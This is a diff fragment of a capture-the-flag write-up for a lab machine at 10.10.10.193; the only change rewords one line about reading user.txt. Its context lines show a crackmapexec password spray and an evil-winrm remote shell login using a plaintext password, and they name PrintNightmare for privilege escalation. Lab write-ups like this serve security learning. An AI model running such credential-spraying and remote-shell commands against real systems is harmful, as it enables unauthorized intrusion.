@@ -125,7 +125,7 @@ I tried this password for all of the users I got from querydispinfo , I created 
 ```crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success``` </br>
 And I found the suitable user: svc-print </br>
 ```evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'``` </br>
-And user.txt: ```C:\Users\svc-print\desktop> type user.txt``` </br>
+Grabbed user.txt flag: ```C:\Users\svc-print\desktop> type user.txt``` </br>
 
 # Privilege Escalation
 I found out that Papercut print logger was vulnerable to [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) (Print Nightmare): </br>
